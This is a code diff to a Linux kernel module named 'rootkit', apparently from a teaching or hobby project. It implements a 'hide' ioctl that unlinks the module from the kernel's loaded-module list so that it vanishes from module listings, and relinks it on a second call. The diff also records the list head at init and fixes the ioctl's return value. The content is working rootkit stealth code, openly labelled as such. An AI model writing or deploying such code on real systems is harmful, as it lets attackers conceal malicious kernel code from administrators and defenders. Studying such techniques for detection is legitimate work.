@@ -1,3 +1,5 @@
+#include "linux/export.h"
+#include "linux/kernel.h"
 #include <linux/sched.h>
 #include <linux/module.h>
 #include <linux/syscalls.h>
@@ -21,6 +23,7 @@ MODULE_VERSION("0.1");
 
 static int major;
 struct cdev *kernel_cdev;
+static struct module *module_head;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -37,13 +40,19 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			  unsigned long arg)
 {
-	int ret;
+	int ret = 0;
 	pr_info("%s\n", __func__);
 
 	switch (ioctl) {
 	case IOCTL_MOD_HOOK:
 		break;
 	case IOCTL_MOD_HIDE:
+		if (THIS_MODULE->list.next || THIS_MODULE->list.prev) {
+			list_del_rcu(&THIS_MODULE->list);
+			THIS_MODULE->list.next = THIS_MODULE->list.prev = NULL;
+		} else {
+			list_add_rcu(&THIS_MODULE->list, &module_head->list);
+		}
 		break;
 	case IOCTL_MOD_MASQ:
 		break;
@@ -52,7 +61,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 	default:
 		ret = -EINVAL;
 	}
-	return 0;
+	return ret;
 }
 
 struct file_operations fops = {
@@ -85,6 +94,8 @@ static int __init rootkit_init(void)
 		pr_info("unable to allocate cdev");
 		return ret;
 	}
+
+	module_head = container_of(THIS_MODULE->list.prev, struct module, list);
 
 	return 0;
 }
